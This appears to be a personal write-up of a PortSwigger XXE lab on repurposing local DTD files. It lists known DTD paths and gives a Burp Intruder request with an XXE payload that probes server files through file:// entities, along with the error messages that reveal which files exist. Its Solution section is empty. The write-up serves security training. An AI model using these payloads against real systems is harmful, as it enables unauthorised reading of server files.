# Lab: Exploiting XXE to retrieve data by repurposing a local DTD
## Description

Great [article](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/) which lead to the following attack plan:
* Find DTD files available on target system
* Enumerate the entities declared in each DTD
* Test each of the entities with common injection patterns
* Report the result summary to the console and the working payloads to a markdown file.

First, I used Burp Intruder to enum all DTD files using the following list of knwon DTD files:
```
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/struts/struts-config_1_0.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
```

Then used Burp Intruder configuration as shown below:
```yaml
POST /product/stock HTTP/1.1
Host: acc21ff11e9b3c08c0ca34aa00de005d.web-security-academy.net
Cookie: session=ek3LOa0BJMPwnDYojg35mwemZ6oChYVl
Content-Length: 210
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://§FILENAME§"> %xxe;]>
<stockCheck>
	<productId>1</productId>
	<storeId>&xxe;</storeId>
</stockCheck>
```

This enum resulted in the following two error messages:

`XML parser exited with non-zero code 1: /usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd (No such file or directory)`

vs

`XML parser exited with non-zero code 1: The entity "xxe" was referenced, but not declared.`

Based on the output above, we can determine which files exists on the system. As stated in the Lab description, Portswigger is hinting at `/usr/share/yelp/dtd/docbookx.dtd` which happened to exist on the system! Yey!


## Solution

